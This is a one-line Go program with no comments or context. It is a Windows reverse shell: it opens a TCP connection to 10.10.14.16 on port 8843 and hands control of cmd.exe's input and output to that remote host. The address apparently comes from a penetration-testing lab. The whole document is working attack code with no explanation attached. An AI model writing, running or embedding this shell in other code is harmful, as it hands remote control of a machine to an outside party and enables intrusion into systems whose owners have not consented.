package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","10.10.14.16:8843");cmd:=exec.Command("cmd");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}
